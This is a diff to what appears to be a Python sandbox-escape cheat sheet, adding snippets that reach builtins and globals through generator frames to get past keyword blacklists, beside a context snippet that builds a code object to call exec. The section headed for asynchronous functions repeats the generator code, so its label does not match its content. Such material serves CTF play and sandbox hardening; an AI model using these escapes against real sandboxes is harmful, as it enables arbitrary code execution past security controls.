@@ -203,3 +203,19 @@ https://gist.github.com/CharlesAverill/e7fef5a6e078f14b7ac7b3d318e3e24f?permalin
 # The number of arguments may change based on the Python version
 (lambda x:0).__class__((lambda x:0).__code__.__class__(0, 0, 0, 3, 64, 10, b't\x00d\x01\x83\x01S\x00', (None, 'Your Code Goes Here'), ('exe''c',), ('',), '', '', 1, b'', (), ()), (lambda x:0).__globals__)()
 ```
+
+You can also use generators or async functions.
+
+### Bypass blacklists using generators
+
+```py
+(x for x in ()).gi_frame.f_builtins
+(x for x in ()).gi_frame.f_globals
+```
+
+### Bypass blacklists using asynchronous functions
+```py
+# Way better than (lambda x:x).__globals__
+(x for x in ()).gi_frame.f_builtins
+(x for x in ()).gi_frame.f_globals
+```
